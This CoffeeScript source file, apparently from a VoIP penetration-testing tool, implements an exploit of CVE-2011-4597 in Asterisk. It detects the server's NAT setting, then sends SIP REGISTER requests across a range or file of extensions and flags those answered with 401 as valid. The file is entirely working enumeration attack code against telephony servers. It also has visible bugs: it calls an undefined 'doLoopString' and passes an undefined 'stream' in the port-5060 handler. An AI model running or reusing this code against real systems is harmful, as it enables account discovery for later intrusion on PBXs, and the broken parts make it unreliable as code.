###

Copyright (C) 2013, Jesus Perez <jesusprubio gmail com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

###


# ---------------------- Requires --------------------------------

{SipMessage} = require "../tools/sipMessage.coffee"
{AsteroidsConn} = require "../tools/asteroidsConn.coffee"
{Parser} = require "../tools/parser.coffee"
{Printer} = require "../tools/printer.coffee"
{Utils} = require "../tools/utils.coffee"
{Grammar} = require "../tools/grammar"
dgram = require "dgram"
fs = require "fs"


# ----------------------- Class ----------------------------------
###
Vulnerability: http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4597

Affected versions: 
- In 1.4 and 1.6.2, if one setting was nat=yes or nat=route and the other was either 
 	nat=no or nat=never. In 1.8 and 10, when one was nat=force_rport or nat=yes and the 
 	other was nat=no or nat=comedia. 
- Whith default configuration are vunerable version 1.4.x before 1.4.43, 1.6.x before
	1.6.2.21, and 1.8.x before 1.8.7.2. 
-	Only over UDP Protocol.
###
exports.SipBruteExtAst =
class SipBruteExtAst
	
	globalNat = ""
	vulnerable = false
	
	# This functions is used to show an error if no response is received in 5 seg.
	callback = () ->
		if globalNat is ""
			Printer.error "SipBruteExtAst: Connection problem: Can't reach the target or no response"


	# It gets the fingerprint and print it with the rest of the outpupt.
	parseReply = (msg, testExt) ->
		# Response parsing.
		code = Parser.parseCode msg
		if code is "401"
			vulnerable = true
			Printer.printEnum testExt, "Auth"
			

	oneEnum = (target, port, srcHost, testExt) ->
		# We can't use here port 5060
		# It could be used also in the first connection. (It's almost imposible but it could happen)
		lport = Utils.randomPort2()
		msgObj = new SipMessage "REGISTER", "", target, port, srcHost, lport, testExt, "", "UDP", "", "", "", false, "", "", "", "", "", ""
		msgSend = (String) msgObj.create()
		conn2 = new AsteroidsConn target, port, "", "UDP", lport
		
		conn2.on "newMessage", (stream) ->
			# We are only interested in request on this port if we received
			# the first response in the another one ("no")
			if globalNat is "no"
				parseReply stream, testExt
	
		conn2.on "error", (error) ->

		conn2.send msgSend
		Printer.highlight "Last tested extension "
		Printer.normal "\"#{testExt}\"\n"
		Printer.removeCursor()


	printHasNat = (hasNat) ->
		Printer.highlight "\nAsterisk appears to have global nat = #{hasNat}\n"


	runWithInfo = (target, port, srcHost, rangeExt, delay) ->
		printHasNat globalNat
		# File with extensions.
		if (Grammar.fileRE.exec rangeExt)
			fs.readFile rangeExt, (err, data) ->
				if err
					Printer.error "sipBruteExtAst: readFile: #{err}"
				else
					extensions = data
					splitData = data.toString().split("\n")
					doLoopString2 = (i) =>
						setTimeout(=>
							oneEnum target, port, srcHost, splitData[i]
							# Last is always empty -> 2.
							if i < splitData.length - 2
								doLoopString2(i + 1)
						,delay);
					doLoopString 0
		# Extension range.
		else
			if (Grammar.extRangeRE.exec rangeExt)
				rangeExtParsed = Parser.parseExtRange rangeExt
				doLoopNum2 = (i) =>
					setTimeout(=>
						oneEnum target, port, srcHost, i
						if i < rangeExtParsed.maxExt
							doLoopNum2(parseInt(i) + 1)
					,delay);
				doLoopNum2 rangeExtParsed.minExt
			else
				oneEnum target, port, srcHost, rangeExt

	
	@run = (target, port, srcHost, rangeExt, delay) ->
	
		firstTime = true
		# First request to see if the server uses global NAT.
		# This extension ("olakase") is impossible to exist.
		lport = Utils.randomPort2()
		msgObj = new SipMessage "REGISTER", "", target, port, srcHost, lport, "olakease", "", "UDP", "", "", "", false, "", "", "", "", "", ""
		msgSend = (String) msgObj.create()
		conn = new AsteroidsConn target, port, "", "UDP", lport
		
		conn.on "newMessage", (stream) ->
			if firstTime
				globalNat = "yes"
				firstTime = false
				runWithInfo target, port, srcHost, rangeExt, delay

		conn.on "error", (error) ->

		# Socket on 5060
		conn5060 = dgram.createSocket "udp4"
		conn5060.bind 5060
		
		conn5060.on "message", (msg, rinfo) ->
			if firstTime
				globalNat = "no"
				firstTime = false
				runWithInfo target, port, srcHost, rangeExt, delay
			else
				# We are only interested in request on this port if we received
				# the first response in the another one ("yes")
				if globalNat is "yes"
					parseReply stream
					console.log stream
					
		conn5060.on "error", (error) ->
			Printer.error "SipBruteExtAst: conn5060: #{error}"
								
		setTimeout callback, 5000
		conn.send msgSend, "UDP", lport
